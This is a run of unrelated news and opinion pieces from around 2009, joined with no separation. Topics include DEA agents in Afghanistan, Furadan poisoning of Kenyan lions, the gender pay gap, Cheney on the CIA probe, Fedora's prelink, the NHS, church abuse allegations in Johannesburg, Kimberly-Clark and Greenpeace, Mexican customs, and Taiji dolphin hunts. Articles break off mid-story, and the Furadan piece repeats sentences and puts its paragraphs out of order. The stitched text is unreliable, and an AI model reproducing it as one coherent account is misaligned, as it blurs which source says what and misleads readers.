In response , the number of DEA agents and analysts in Afghanistan will rise from 13 to 68 by September , and to 81 in 2010 .
More agents will also be deployed in Pakistan .
It is “ the most prolific expansion in DEA history , ” Harrigan said .
Richard C. Holbrooke , the U.S. special representative for Afghanistan and Pakistan , told Congress in June that the Obama administration was redirecting resources that lawmakers had appropriated for opium eradication toward the new strategy of “ interdiction , rule of law -- going after the big guys .
And those involve people in the government . ”

The DEA also has been designated as the lead in a multi-agency “ Afghan Threat Finance Cell ” that will go after not only the suspected drug kingpins , but also corrupt politicians and other sources of funding for the insurgency , including cash from wealthy Persian Gulf donors , extortion and kidnappings , according to DEA documents and interviews .
It will also expand a U.S. program to train Afghan counter - narcotics police .
“ A surge not only of military but law enforcement is exactly what we need .
It is something we have always demanded of the U.S. government , ” said M. Ashraf Haidari , political counselor at the Afghan Embassy in Washington , who oversees counter - narcotics and national security issues .
Haidari said the new U.S. focus would allow the Afghan government to go after corrupt elements in government and the security forces , in part through specially trained and vetted Afghan narcotics police units .

DEA agents in Afghanistan will seek to cultivate informants and conduct sting operations .
In battle zones , particularly in the south , they will receive military protection and support when needed .
“ There are a lot of black holes in Afghanistan regarding intelligence , ” Harrigan said .
“ If the military stops a drug caravan , we want to get out there , exploit the evidence , interview the traffickers . ”
Many counter - narcotics officials , current and former , praised the DEA expansion , which they said they had pushed for since late 2006 but had faced seeming indifference or outright opposition from others in the Bush administration , including elements of the military and intelligence communities .
Some of these officials said that their warnings about the growing danger of the Taliban - drug trafficker alliances went unheeded in the years after Sept. 11 , when America ’s focus on counter - terrorism and , later , the war in Iraq , took precedence over counter - narcotics efforts .

In March 2006 , the DEA was given additional authorization by Congress to investigate international drug traffickers if it could show a connection to terrorism .
That allowed it to target and arrest a few top traffickers in Afghanistan .
The next year , a key interagency task force recommended sending more DEA agents into Afghanistan .
But DEA officials say they could n’t deploy the agents because of hiring freezes , a lack of administration support , and the Pentagon ’s failure to get involved in interdiction efforts or to help the drug agents already in the country .
“ We would have needed State Department and White House approval and , moreover , had we sent them over , we knew we would not be able to get them into the field where they needed to be ” without military support , said Michael Braun , who played a lead role in lobbying for the DEA expansion until his retirement seven months ago as its chief of operations .
By 2007 , as the Taliban and Al Qaeda were regrouping , the drug trade reached a record level , with potential opium production up nearly 42 % from the year before , according to DEA and CIA reports .
Advertisement
“ Clearly there was a mistake made early on , ” between 2001 and 2006 , said Thomas Schweich , who became the Bush administration ’s coordinator for counter - narcotics and justice reform in Afghanistan in 2007 .
“ Had we taken this more seriously early on , it never would have gotten as bad as it is . ”
DEA officials pushing for an Afghan expansion in 2007 were supported by then - deputy national security advisor Juan Carlos Zarate , who was in charge of global counter - terrorism and finance issues .
But , Zarate said , deployment was held up again amid negotiations over what kind of role they would play .
Riedel said the Bush White House “ never focused its attention on this until the very , very last days . ”
“ They created the perfect storm :
We ’re losing the war against the Taliban , and we ’ve allowed the development of a huge drug industry which corrupts the very state we ’re trying to help , ” he said .

Two months ago , nine DEA agents participated in the largest U.S. special forces mission in Afghanistan since 2001 , a four - day battle to take out a major Taliban stronghold and drug bazaar in the town of Marjeh in Helmand province .
Authorities say they seized a huge cache of weapons , explosives and bomb - making materials , as well as many tons of drugs in all stages of production .
DEA agents were able to help Afghan authorities arrest and obtain statements from those at the scene and to seize and exploit their cellphones , satellite phones and drug ledgers , said DEA Special Agent Nick Brooke .
“ The beauty of this is that we get evidence out of it , ” Brooke said .
“ And since the operations are bilateral , we can prosecute these people under Afghan law , ” or in some cases under U.S. law .

Several weeks ago , DEA agents led another suspected Afghan drug kingpin , Haji Bagcho , off a plane at Andrews Air Force Base near Washington , after arresting him on U.S. federal drug charges tied to his alleged financing of the Taliban .
At the same time , some current and former officials question whether Afghan government corruption and indifference are too rampant to turn the tide .
Recently , President Hamid Karzai pardoned at least five convicted major drug traffickers , prompting a rare U.S. State Department rebuke .

This article was originally published on July 27 , 2009 , at Britannica ’s Advocacy for Animals , a blog dedicated to inspiring respect for and better treatment of animals and the environment .
Established in 1961 , the Masai Mara National Reserve is one of Kenya ’s numerous protected areas .
It borders Tanzania ’s Serengeti National Park not far from shores of Lake Victoria .
It is a popular safari destination purported to have one of the highest densities of lions ( Panthera leo ) on the continent .
However , the Mara has become better known as the setting of high - profile lion poisonings in 2008 .
Sadly , such poisonings have occurred throughout Kenya for several years , both inside and outside of protected areas .
According to a recent report from the Kenyan Forestry and Wildlife Ministry , which was provided to the environmental group Wildlife Direct by the Kenya Wildlife Service ( KWS ) , 76 lions have been poisoned throughout the country between 2001 and 2009 .
The lions are dying because they pose a threat to livestock in the area .
The local Maasai people , who subsist almost exclusively on the meat and milk from their cattle , sheep , and goats , have traditionally fought and killed lions to protect their herds .
Some Maasai have traded the spear , their traditional lion - fighting tool , for a very dangerous chemical pesticide and pollutant called Furadan .
After a lion kills its prey , it partially consumes the carcass and may return to it at a later time for an additional meal .
If the carcass is discovered by livestock owners between feedings , they often spread Furadan on the carcass .
When one or more lions return to feed again ( or if vultures or other animals consume parts of the carcass ) , they become poisoned and die shortly thereafter .
In early 2009 , the news of lion poisonings in the Masai Mara and across Kenya came to prominence as a result of a story on the American news program 60 Minutes .

Furadan , which goes by the official title of Carbofuran , is made by the FMC Corporation , an American company based in Philadelphia .
It is a highly toxic , granular insecticide - nematicide that is applied to crops to protect them from insects , such as the soybean aphid ( Aphis glycines ) in the United States .
East African farmers also use it on their crops ; however , some buyers of Furadan purchase it to kill lions and other animals .
In addition to the figures on lions mentioned above , the Ministry of Forestry and Wildlife reports that , between 1995 and 2002 , members of several bird species ( including egrets , storks , and spoonbills ) have died by the “ pickup truckload ” as a result of Furadan poisoning , along with 252 vultures and 24 hippopotamuses .
Some of this poisoning was probably intentional ; however , most was probably incidental , since many birds may have mistaken the Furadan granules for edible seeds .
Furadan , which goes by the official title of Carbofuran , is made by the FMC Corporation , an American company based in Philadelphia .
It is a highly toxic , granular insecticide - nematicide that is applied to crops to protect them from insects , such as the soybean aphid ( Aphis glycines ) in the United States .
Furadan has been designed to kill a wide variety of insects and nematodes ( roundworms ) , but very small amounts ingested by birds , lions , and even people are also fatal .
The chemical is a carbamate insecticide that works by inhibiting acetylcholinesterase , the enzyme that degrades acetylcholine ( the messenger of the parasympathetic nervous system , which controls salivation , urination , movement of the skeletal muscles , etc. ) .
After an animal ingests Furadan , its acetylcholine levels remain high , exaggerating the activities of the parasympathetic system .
The animal typically dies from depressed respiratory function .
It should be noted that the use of Furadan is outlawed in Europe and severely restricted in the United States .
A more accurate label for these chemicals is biocide , because they also kill or debilitate other nontarget organisms .
The 60 Minutes story aired on March 29th , 2009 .
In June , the Kenyan government began discussions to ban the product .
FMC stopped selling Furadan to Kenya after the Maasai Mara killings in 2008 and has instituted a buy - back program of previously sold stock .
Nevertheless , according to Wildlife Direct , some of the product remains available for purchase in Kenya through unknown distributors .
Kenya ’s Furadan episode is another chapter in the ongoing debate between those who wish to ban pesticides and those who do not .
On the one hand , without chemical fertilizers and pesticides , the crop yields of the Green Revolution ( the tremendous increase in wheat and rice yields after 1945 ) could not have happened .
Insecticides , rodenticides , fungicides , and others protect food and feed crops while they grow .
On the other hand , it is important to keep in mind that the word “ pesticide ” is a misnomer .
At first glance , reading the word conjures up the notion of a chemical that targets “ pests ” and pests alone .
In reality , most pesticides are not selective .
A more accurate label for these chemicals is biocide , because they also kill or debilitate other nontarget organisms .
Consider the American experience with dichlorodiphenyltrichloroethane , or DDT , from the 1940s through the early 1970s .
DDT was very effective against a wide variety of insects ; however , since it was chemically very stable , it accumulated in the tissues of animals that preyed on insects as well as well as in the tissues of animals that consumed these insect predators .
As a result of this bioaccumulation , songbirds and large predatory birds experienced reproductive problems .
In 1962 , Rachel Carson penned Silent Spring , a book whose title alluded to the absence of songbirds in some future time , served as a warning against the dangers of haphazard pesticide use .
As a result of Carson ’s work , pesticide regulations in the United States and other developed nations became more stringent .
First , some Maasai warriors are working as so - called Lion Guardians as part of an initiative under the direction of a group called Living with Lions .
Ultimately , Furadan presents a frightening prospect because of its high toxicity and ease of use .
Combined with weak regulations governing the use of pesticides , Kenya is an environment where Furadan and other chemicals can be used indiscriminately and for purposes other than protecting crops .
There have been several intentional poisonings involving Furadan beyond Kenya , however .
One such case involved a southern Illinois farmer and his son who killed some 20,000 red- winged blackbirds ( Agelaius phoeniceus ) and several thousand members of other species with Furadan in 2000 .
Second , reimbursement programs have been established to compensate Maasai livestock owners for animals lost to lions .
Although stocks of the chemical in Kenya are decreasing , the success of its phaseout will depend on the fortitude of Kenya ’s lawmakers and the strength of incentives designed to keep people from using the product .
There are also two other factors that are at work to help the lions .
First , some Maasai warriors are working as so - called Lion Guardians as part of an initiative under the direction of a group called Living with Lions .
The Lion Guardians program was started in 2006 .
The guardians track lion movements and warn livestock owners when lions are in the vicinity of livestock herds , giving shepherds an opportunity to move their herds out of the way .
Second , reimbursement programs have been established to compensate Maasai livestock owners for animals lost to lions .
These programs provide financial incentives to herders to dissuade them from lacing the carcasses with Furadan .
The first such program , called the Predator Compensation Fund , began in 2003 .
Similar programs exist in some European countries and various U.S. states to pay livestock owners for animals killed by gray wolves ( Canis lupus ) .
Such programs have contributed to the reduction of tensions between livestock owners and wolves in attack - prone regions and are credited with helping wolves to reconstitute their numbers .
Perhaps Kenya ’s version of this program will help in the long - term recovery of lion populations .

How Can I Help ?
The Department of Labor recently released its annual study Highlights of Women ’s Earnings in 2008 ( HT : Christina Sommers ) and opens the report with the following statement :
In 2008 , women who were full - time wage and salary workers had median weekly earnings of $ 638 , or about 80 % of the $ 798 median for their male counterparts .
In 1979 , the first year for which comparable earnings data are available , women earned about 62 % as much as men .
After a gradual rise in the 1980s and 1990s , the women ’s - to - men ’s earnings ratio peaked at 81 % in 2005 and 2006 .
MP : Does n't the BLS ' use of the term " male counterparts " ( Webster definition : " one remarkably similar to another " ) imply an " apples to apples " comparison between male and females workers , as if all relevant explanatory factors have been controlled for , i.e. the ceteris paribus condition has been imposed ?
For example , buried in the BLS report are these two interesting facts :
1 . In Table 1 , it is reported that for those workers who have never been married , women make 94.2 % of their " male counterparts . "
2 . In Table 8 , it is reported that for single workers with no children under 18 years old ( marital status includes never married , divorced , separated and widowed ) , women make 95.6 % of their " male counterparts . "
In these two examples , I would argue that the term " male counterparts " is much more valid than the BLS ' use of the term in the opening statement of its report when it is referring to all workers .
Since marriage and having children affect male and female earnings differently , men and women workers can't really be considered " counterparts " in a statistical sense , and any unadjusted comparisons would be comparing apples to oranges .
In fact , some research has concluded that the factors of age , marriage and motherhood explain all of the male - female pay gap .
For example , in a 2005 NBER working paper "
What Do Wage Differentials Tell Us about Labor Market Discrimination ?
" by June O'Neill ( Professor of economics at Baruch College CUNY , and former Director of the Congressional Budget Office ) , she conducts an empirical investigation using Census data and concludes that :
" There is no gender gap in wages among men and women with similar family roles .
Comparing the wage gap between women and men ages 35 - 43 who have never married and never had a child , we find a small observed gap in favor of women , which becomes insignificant after accounting for differences in skills and job and workplace characteristics .
Cheney Criticizes Probe of Bush - Era CIA Interrogators
By Michael Bowman
Washington
30 August 2009
Former U.S. Vice President Dick Cheney says the Obama administration 's decision to open a criminal probe of U.S. interrogators in the war on terror is politically motivated and detrimental to America 's national security .
In an interview on U.S. television , Cheney was blunt when asked about the Justice Department 's decision to investigate Central Intelligence Agency operatives who interrogated terror suspects during the former Bush administration .
" I think it is a terrible decision , " he said .
Cheney was speaking on Fox News Sunday , days after Attorney General Eric Holder ordered a probe of CIA officers believed to have exceeded Bush - era directives on acceptable interrogation techniques .
The order coincided with the release of a CIA inspector general 's report on the use of so - called " enhanced interrogation techniques " in the years after the September 11 , 2001 terror attacks on the United States .
Cheney , a longtime defender of the Bush administration 's efforts to extract information from terror suspects , said taking legal action against those entrusted with protecting America is a grave error .
" We ask those people to do some very difficult things that sometimes put their own lives at risk , " he said .
" And if they are now going to be subject to being investigated and prosecuted by the next administration , nobody is going to sign up for those kinds of missions .
It is a very , very devastating effect that it has on morale inside the intelligence community . "
The former vice president accused President Barack Obama of reversing his stated goal of " looking forward , not backward " when it comes to intelligence gathering , and doing so to placate left wing political activists .
White House officials say the decision to launch an investigation was reached independently by Attorney General Holder as a legal matter , not a political one .
Cheney insisted that Bush - era intelligence operations yielded critical information from detainees that prevented another terrorist attack after 9 - 11 .
" The evidence is overwhelming that the EITs [ enhanced interrogation techniques ] were crucial in getting them to cooperate , and that the information they provided did , in fact , save thousands of lives , " he said .
President Obama does not dispute that valuable intelligence was gathered during the Bush years .
But he has questioned whether the harshest interrogation techniques were necessary .
" Could we have gotten that same information without resorting to these techniques ?
And it does not answer the broader question : are we safer as a consequence of having used these techniques ? " said Mr. Obama .
Attempting to answer those questions is a former Bush administration State Department official , Lawrence Wilkerson , who has emerged as a vocal critic of former President Bush , spoke in a VOA interview :
" There is no evidence that harsh interrogation and torture worked , that is to say that it produced actionable intelligence , " said Wilkerson .
" And there is every evidence in the IG [ CIA inspector general ] report that what happened from 2002 - 2004 really did not uncover any imminent attack on the United States . "
On other matters , former Vice President Cheney said he does not believe U.S. diplomatic outreaches to Iran will convince Tehran to abandon its nuclear ambitions .
He also said former President Bill Clinton 's trip to North Korea to free two American journalists was a propaganda coup for Pyongyang , and reiterated his view that establishing a timetable for withdrawing U.S. troops from Iraq is a mistake that could squander years of American sacrifices to foster democracy in the country .
Is pre-linking worth it ?

The recent problem with prelink in Fedora Rawhide has led some to wonder about what advantages pre-linking actually brings — and whether those advantages outweigh the pain it can cause .
Pre-linking can reduce application start up time — and save some memory as well — but there are some downsides ; not least the possibility of an unbootable system as some Rawhide users encountered .
The advantages are small enough , or hard enough to completely quantify , that it leads to questions about whether it is justified as the default for Fedora .
Linux programs typically consist of a binary executable file that refers to multiple shared libraries .
These libraries are loaded into memory once and shared by multiple executables .
In order to make that happen , the dynamic linker ( i.e. ld.so ) needs to change the binary in memory such that any addresses of library objects point to the right place in memory .
For applications with many shared libraries — GUI programs for example — that process can take some time .
The idea behind pre-linking is fairly simple : reduce the amount of time the dynamic linker needs to spend doing these address relocations by doing it in advance and storing the results .
The prelink program processes ELF binaries and shared libraries in much the same way that ld.so would , and then adds special ELF sections to the files describing the relocations .
When ld.so loads a pre-linked binary or library , it checks these sections and , if the libraries are loaded at the expected location and the library has n't changed , it can do its job much more quickly .
But there are a few problems with that approach .
For one thing , it makes the location of shared libraries very predictable .
One of the ideas behind address space layout randomization ( ASLR ) is to randomize these locations each time a program is run — or library loaded — so that malicious programs cannot easily and reproducibly predict addresses .
On Fedora and Red Hat Enterprise Linux ( RHEL ) systems , prelink is run every two weeks with a parameter to request random addresses to alleviate this problem , but they do stay fixed over that time period .
In addition , whenever applications or libraries are upgraded , prelink must be run again .
The linker is smart enough to recognize the situation and revert to its normal linking process when something has changed , but the advantage that prelink brings is lost until the pre-linking is redone .
Also , the kernel randomly locates the VDSO ( virtual dynamically - linked shared object ) " library " , which , on 32 - bit systems , can overlap one of the libraries , requiring some address relocation anyway .
Overall , pre-linking is a bit of a hack , and it is far from clear that its benefits are substantial enough to overcome that .
Fedora and Red Hat Enterprise Linux ( RHEL ) enable pre-linking by default , while most other distributions make prelink available , but seem unconvinced that the benefits are substantial enough to make it the default .
Because it is a very system - dependent feature , hard performance numbers are difficult to find .
It certainly helps in some cases , but is it really something that everyone needs ?
Matthew Miller brought that question up on the fedora - devel mailing list :
I see [ prelink ] as adding unnecessary complexity and fragility , and it makes forensic verification difficult .
Binaries can't be verified without being modified , which is far from ideal .
And the error about dependencies having changed since prelinking is disturbingly frequent .
On the other hand , smart people have worked on it .
It 's very likely that those smart people know things I do n't .
I can't find any good numbers anywhere demonstrating the concrete benefits provided by prelink .
Is there data out there ? [...]
Even assuming a benefit , the price may not be worth it .
SELinux gives a definite performance hit , but it 's widely accepted as being part of the price to pay for added security .
Enabling prelink seems to fall on the other side of the line .
What 's the justification ?
Glibc maintainer Ulrich Drepper noted that pre-linking avoids most or all of the cost of relocations , while also pointing out that the relatively new symbol table hashing feature in GCC reduces the gain for pre-linking .
He also described an additional benefit : memory pages that do not require changes for relocations will not be copied ( due to copy - on - write ) and can thus be shared between multiple processes running the same executable .
But his primary motivation may have more to do with his work flow : " Note , also small but frequently used apps benefit .
I run gcc etc a lot and like every single saved cycle . "
The effect of pre-linking can be measured by using the LD_DEBUG environment variable as Drepper described .
Jakub Jelinek , who is the author of prelink , posted some results for OpenOffice.org
Writer showing an order of magnitude difference in the amount of time spent doing relocations between pre-linked and regular binaries .
Those results are impressive , but , at least for long - running programs , start up time does n't really dominate — desktop applications , or often - used utilities , are the likely benefactors .
As Miller puts it :
If I can get a 50 % speed up to a program 's startup times , that sounds great , but if I then leave that program running for days on end , I have n't actually won very much at all -- but I still pay the price continuously .
( That price being : fragility , verifiability , and of course the prelinking activity itself . )
For 32 - bit processors , though , which are those most likely to benefit from the memory savings , there is still the VDSO overlap problem .
John Reiser did an experiment using cat and found that glibc needed to be dynamically relocated fairly frequently :
This means that glibc must be dynamically relocated about 10 % of the time anyway , even though glibc has been pre-linked , and even though / bin / cat is near minimal in its use of shared libraries .
When a GNOME app uses 50 or more pre-linked shared libs , as claimed in another thread on this subject , then runtime conflict and expense are even more likely .
There does n't seem to be a large interest in removing the prelink default for Fedora , but one has to wonder , if the savings are as large and widespread as people seem to think , why other distributions have been reluctant to adopt it .
Part of the reason may be the possibility of a prelink bug rendering systems unbootable or reluctance to rely upon something that requires modifying binaries and libraries , regularly , to keep everything in sync .
The security issues may also play into their thinking , though Jelinek argues that security - sensitive programs should be position - independent executables ( PIE ) that are not pre-linked , and thus have ASLR done for every execution .
The United Kingdom has a free - at - the - point - of - delivery universal health care system .
The National Health Service , founded in 1948 , is funded from National Insurance and general taxation , and covers primary and secondary treatment , drugs , dentistry , and eye health .
There is a huge controversy in America at the moment about health care , who should pay , who should be covered , how the system should be organised , and how the whole health system should be structured .
I have seen on various places online a number of references to the Canadian system ( about which I know almost nothing ) and to the National Health Service ( NHS ) in the United Kingdom .
A lot of the comments I 've seen in various places online bear little or no resemblance to how the NHS actually works .
This article sets out how the system came into being , how it works , who pays for it and how , and who is entitled to NHS treatment and coverage .
The NHS employs more than 1.5 million people in the country as a whole .
It is the fourth biggest direct employer in the world , after the Chinese Army , Wal- mart , and the Indian Railways .
A church in South Africa that provides refuge for thousands of homeless Zimbabweans is investigating allegations of child sex abuse .
A teacher at the Central Methodist Church in Johannesburg has been suspended and evicted after being accused of soliciting a girl for sex .
Between 10 and 15 boys and girls without parents have been relocated from the church to shelters around the city , some after allegedly being abused .
Bishop Paul Verryn , head of the inner city church , said he feared the problem was widespread and an internal commission had been set up to examine the claims .
Verryn estimates that 3,000 - 3,500 people sleep in the church each night , including 110 unaccompanied minors .
About 85 % are Zimbabweans who have fled the political and economic crisis in their country .
They endure cramped conditions and threats such as tuberculosis and violence .
Médecins Sans Frontières runs a health clinic next to the church .
Some of the refugees have become teachers at a 525 - pupil school set up by the church last year .
They earn a salary of R3,500 ( £ 280 ) , funded by a religious organisation in New York and the Dutch government .
But one teacher , a Zimbabwean male , has been suspended and removed from the building , and is due to be interviewed by an internal commission .
An anonymous letter sent to Verryn claimed that the man had approached a girl and asked her to be his girlfriend and to sleep with him .
The girl rejected his advances , after which he allegedly " made life difficult for her " .
South Africa 's Eyewitness
News television reported that one child said she had been traumatised by her experiences at the church and that many girls there were being abused .
She described how girls were being coerced into performing sexual acts for their teachers .
" One of the teachers said ' I 'll buy you toiletries ' , " she was quoted as saying .
" A girl in that place ‑ toiletries are gold .
He abuses you and then he buys you toiletries . "
The girl , who was not named , added : " I just wish people out there could open their eyes and see what 's going on and try and help the young girls ‑ the young children ‑ who are in there and try and get them out because that 's the most important thing . "
Verryn said he took the claims very seriously .
" Even the vaguest allegation needs to be examined in the scenario we are in here , " he said .
" Normally you assume someone is innocent until proven guilty .
Here one has to assume guilt until innocence is proved . "
He said he would be surprised if it was only one teacher .
" I think it 's more than one and not just teachers .
It 's men generally .
We are very conscious this issue has to be watched all the time . "
Verryn said the problem had been regularly addressed in church .
" We 've said to the children , ' Your body is sacred .
Nobody has the right to touch you if you do n't like it .
If somebody does interfere with you , do n't keep quiet about it . '
" We need to talk about it .
One of the good things to come out of this is the exposure , which gives us more chance of beating it . "
It was also claimed that children as young as 14 were being recruited to commit crimes .
Johannesburg police said they had not received reports of such cases , nor of alleged sexual abuse at the church .
A move that has long been debated by the Obama Administration could soon become reality , as officials say the State Department delivered an ultimatum to Pakistan President Asif Ali Zardari during his visit last week cautioning that if he does n’t move against the Taliban forces in the city of Quetta the US will .
Such attacks would be a major escalation of the unpopular US drone strikes against the nation , so far confined to the area in and around the Federally Administered Tribal Areas ( FATA ) .
Quetta , a city of three quarters of a million people , is the capital of Pakistan ’s largest province , Balochistan .
The Pakistani government has been reluctant to move against the city , which has reportedly become a hiding point for much of the former Afghan government , citing both the lack of threat posed to the Pakistani government and the lack of intelligence provided by the US about exactly where to act .
In fact , the attack on Quetta may turn out to be even more than lobbing a few missiles , as reportedly officials have discussed sending ground forces into the town to “ capture or kill ” any Taliban they find .
Already struggling to keep the populace calm amid growing resentment of the US role in the nation , if American missiles or worse , American ground forces start pouring into a major Pakistani city to fight people who the government says are n’t posing a threat to Pakistan , all bets are likely off .
Vice President Joe Biden , among others , have been pressing for an escalation of drone strikes as a way of “ stabilizing ” Pakistan .
It seems , however , that there are few things that would be more destabilizing than attacking Quetta .
Since the PS3 Slim was officially unveiled earlier this week , news has slowly trickled in about what the differences are between the new PS3 slim , and it ’s heavier predecessor .
Now a new feature has been revealed that will make audiophiles rejoice .
The PS3 for the past 3 years has been at the top of the line as far as Blu - Ray players were concerned .
The one thing that was holding it back was the fact it could n’t bitstream Dolby TrueHD , and DTS - HD Master Audio .
The PS3 instead had to decode it and send it to your receiver as Linear PCM .
That ’s a thing of the past as the new PS3 slim can bitstream HD audio output to your receiver .
No more decoding needed , which allows for lossless audio .
The average gamer wont notice the difference , as you need a high - end audio set up to really appreciate the change in performance .

WASHINGTON ( Reuters ) - Paper products giant Kimberly - Clark Corp joined forces with Greenpeace on Wednesday , pledging to conserve forests by getting wood fiber from environmentally responsible sources .

In an announcement with the environmental group , which waged a nearly 5 - year campaign against the company for clear - cutting in Canada ’s boreal forest , Kimberly - Clark said it would stop buying wood fiber from the vast woodland which stretches across the country unless it is certified by the Forest Stewardship Council .
“ We are a 100 - plus - year - old company .
We want to be around here for another 100 - plus years or more , and the only way we can be is by using sustainable forest practices , ” Kimberly - Clark ’s Suhas Apte , vice president of global sustainability , said in a telephone interview .
Kimberly - Clark is among the world ’s largest paper - products manufacturers , including such brands as Kleenex , Scott and Cottonelle .
The company pledged to get all its wood fiber for tissue products from environmentally responsible sources , increasing the use of recycled fiber and certified fiber .
By the end of 2011 , the company said 40 percent of its North American tissue fiber -- about 600,000 tonnes -- will be either recycled or certified , an increase of more than 70 percent over 2007 levels .
Forest conservation is considered a key weapon against climate change , because forests lock up over 20 percent of all human - generated carbon dioxide , a greenhouse gas that spurs global warming when it gets into the atmosphere .
CONSERVING CANADIAN FOREST
The trees and soil of Canada ’s boreal forest store some 186 billion tonnes of carbon , equivalent to 27 years of global greenhouse gas emissions , said Richard Brooks of Greenpeace Canada .
“ Canada ’s boreal forest is the largest ancient forest left in North America , ” Brooks said in a statement .
“ Though vast , already 60 percent is allocated to logging companies for development .
Less than 10 percent of the forest is permanently protected . ”
Kimberly - Clark ’s new standards could bring some of the unspoiled areas of the forest closer to permanent conservation , Brooks said .
“ There ’s a cultural difference between a group like Greenpeace and a group like Kimberly - Clark , ” said Scott Paul , director of Greenpeace USA ’s Forest Campaign .
“ But we were able to find ... a path forward that truly pushed Kimberly - Clark down a road of greater and greater sustainability but allowed them to pursue a business model that allowed the quality products people expect . ”
Greenpeace ’s “ Kleercut ” campaign against Kimberly - Clark began in November 2004 and featured such eye - catching actions as setting up a “ forest crime scene ” outside the company ’s Canadian headquarters and a print ad in The New York Times that told readers they were destroying the boreal forest every time they used Kleenex tissue .
The environmental group ended the campaign on Wednesday with a video posted at www.greenpeace.org/kleercut
The change comes four months after Kimberly - Clark introduced a line of paper products using recycled material .
Critics fret that health care reform would undermine American family values , not least by convening somber death panels to wheel away Grandma as if she were Old Yeller .
But peel away the emotions and fearmongering , and in fact it is the existing system that unnecessarily takes lives and breaks apart families .
My friend M.  you ’ll understand in a moment why she ’s terrified of my using her name  had to make a searing decision a year ago .
She was married to a sweet , gentle man whom she loved , but who had become increasingly absent - minded .
Finally , he was diagnosed with early - onset dementia .
The disease is degenerative , and he will become steadily less able to care for himself .
At some point , as his medical needs multiply , he will probably need to be institutionalized .
The army took control over Mexico 's customs points during the changover
Mexico has replaced more than 1,000 customs agents at airports and border crossings with newly trained inspectors in a major crackdown on corruption .
Officials said the agents had been let go after their contracts were allowed to expire .
They said the new 1,400 - strong force had been rigorously trained to detect contraband , from guns and drugs to appliances smuggled into the country .
During the changeover , the army took over customs border posts .
" This change is part of our response to new demands in the fight against contraband , " Mexico 's customs authority spokesman Pedro Canabal said .
He said that the deployment of the new agents would improve Mexico 's tax collection , noting that nearly 50 % of the country 's VAT was collected at customs .
He said the government was also trying to seize more drugs and also guns smuggled in from the US .
Broad support
Mexican President Felipe Calderon has declared war on the illegal narcotic organisation in Mexico , deploying 40,000 troops to fight the cartels .
Thousands have been killed in drug - related violence in the past few years .
The replacement of the customs officers follows a similar operation in the police force , where thousands have been fired .
Last week , President Calderon was offered lavish praise by his US counterpart Barack Obama for his determined approach to defeat the drug cartels .
The strategy remains broadly popular among Mexicans , the BBC's Stephen Gibbs in Mexico City says .
However he says many are weary of one consequence of the policy : that violence between competing drug cartels and the Mexican authorities confronting them appears to be getting worse .
Keiko Hirao sits on pebbly Whale Beach in the late morning sun , taking in this town ’s main summertime attraction -- two playful dolphins swimming alongside tourists in a picturesque cove .
The creatures flap their tails and perform acrobatic jumps as dozens of delighted children tread water in the aquatic petting zoo .
But Hirao is troubled .
She knows something that many other tourists here do n’t .
“ When I found out , ” the Osaka resident said , “ I cried . ”
Each September , Whale Beach is closed to swimming .
That ’s when the dolphin slaughter begins .

Taiji is one of the few towns worldwide where the mammals are legally herded from the sea and killed in groups so their meat can be sold at market , experts say .
Over seven months , 2,300 of the dolphins are steered into a hidden cove , where the choicest specimens are selected for sale to dolphin parks for $ 150,000 each .
The rest are speared by fishermen in a frenzy of blood and thrashing fins .
Officials of the isolated town of 3,500 residents on Japan ’s southeastern coast have long blocked outsiders from observing the kills .
Now a controversial U.S. - made film documenting the carnage has unleashed worldwide outrage over the practice and led the fishermen to say they will release 100 dolphins from the year ’s first catch ( while making no promises about cutting back on future kills ) .
“ The Cove , ” winner of the 2009 Audience Award at the Sundance Film Festival , portrays Taiji as a charming burg with a darker self , a place where Norman Rockwell meets Norman Bates .
Advertisement
To foil efforts to block their access , the filmmakers used divers with sophisticated underwater equipment , aerial drones , as well as surveillance and military - style thermal cameras .
The result is part graphic horror flick , part suspense thriller and part “ gotcha ” movie , its dramatic scenes of determined undercover police giving chase to cameramen ending with chilling footage of churning water stained red .
Ric O’Barry , the documentary ’s human protagonist , is a dolphin trainer - turned - activist who has traveled to Taiji for 15 years to crusade against the hunt .
Once the dolphin trainer for the 1960s TV series “ Flipper , ” the 68 - year - old now feels partially responsible for people ’s fascination with captive - dolphin shows .
“ In my life , I have watched dolphins give birth and have nursed them back to health when they were sick .
I ’ve captured and trained them , ” he said .
“ When I go to this cove and see the slaughter , it sickens me .
Advertisement
“ It ’s just over the top in terms of cruelty .
It has kept me awake at night for 15 years .
Once you see it , you ca n’t un - see it . ”
Officials here say dolphin hunts have long been a part of Taiji ’s fishing culture .
Although many have seen segments of “ The Cove ” on the Internet , most would not discuss the issue .
“ If you want to talk about dolphins , it ’s very difficult to have a conversation , ” said one town official who declined to give his name .
In a rare interview , one fisherman defended the cove ’s restricted status .
Advertisement
“ In the West , the places where you kill the cows and pigs are always off limits , ” said Shuichi Matsumoto , who has gone on the dolphin hunt for years .
Joining 25 other fishermen on specially equipped boats , he bangs a long submerged pole with a hammer to create a wall of sound that drives the acoustically sensitive mammals toward shore , where they are killed the following day .
“ We do n’t want to show this to anyone . ”
In a park overlooking Taiji ’s majestic coastline , residents gather each April 29 at a statue of a large right whale to pray for the souls of the creatures taken from the sea .
Advertisement
The local catch once was mostly large cetaceans , a practice that goes back centuries here , and Taiji prides itself as the birthplace of Japanese whaling .
But ancient scrolls show that dolphins were also hunted here , say officials at the Taiji Whale Museum .
These days , the town is dominated by symbols of the catch .
There are whale statues , whale - tail fountains and a dolphin - themed resort .
Public buses are promoted by cutesy whale cartoon figures .
O’Barry first came to Taiji in 1993 , guiding journalists interested in writing about the dolphin kills .
He was harassed by supporters of the hunt and soon resorted to disguises involving wigs , hats , sunglasses and even dresses .
Louie Psihoyos , the director of “ The Cove , ” first thought O’Barry was paranoid but soon saw that Taiji meant business about its privacy .
Advertisement
“ They told us they treated the dolphins humanely , like relatives , ” Psihoyos said of his initial meeting with local officials .
“ Then they threatened us .
They said it was dangerous for us to be there . ”
The filmmakers say many Japanese outside Taiji still do n’t know about the dolphin kills , and they plan to release a Japanese version free on the Internet if they do n’t find a distributor here .
For years , Japan has faced worldwide protests over its whaling industry .
After the International Whaling Commission instituted a commercial whaling moratorium in the mid-1980s , the country announced that it would continue to harvest a small number of whales for scientific purposes .
Japan insists that dolphins , whose meat is served mostly in the countryside , and other small cetaceans are not covered by the moratorium .
Advertisement
The Japanese kill about 20,000 dolphins a year , most harpooned in the open sea .
Taiji is the only place where the creatures are herded to shore and then killed , said Shigeki Takaya , an official with the Fisheries Ministry .
He said the government monitors the dolphin kills .
“ Most reporters tell one side of the story , ” he said .
“ They are prejudiced , so I usually do n’t comment on this .
We have to respect our own culture .
But why do you only focus on Taiji ?
